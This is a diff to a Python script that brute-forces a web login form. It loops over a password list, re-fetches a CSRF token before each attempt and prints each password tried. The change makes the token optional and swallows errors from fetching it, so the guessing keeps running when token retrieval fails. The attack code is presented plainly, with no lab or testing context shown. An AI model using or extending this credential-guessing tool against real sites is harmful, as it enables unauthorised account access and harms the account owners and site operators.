@@ -25,7 +25,7 @@ def get_csrf_token(session, login_page_url):
     
     return csrf_token
 
-def attempt_login(session, login_page_url, username, password, csrf_token):
+def attempt_login(session, login_page_url, username, password, csrf_token=None):
     # Prepare the login data with username, password, and the extracted CSRF token
     login_data = {
         'username': username,
@@ -52,7 +52,10 @@ def main():
     # Loop through each password and attempt login
     for password in passwords:
         # Fetch a fresh CSRF token for each login attempt
-        csrf_token = get_csrf_token(session, LOGIN_PAGE_URL)
+        try:
+            csrf_token = get_csrf_token(session, LOGIN_PAGE_URL)
+        except:
+            print("Failed to fetch CSRF token.")
         
         # Debugging output: Print the token and password being tried
         print(f"Trying password: {password} with CSRF token: {csrf_token}")
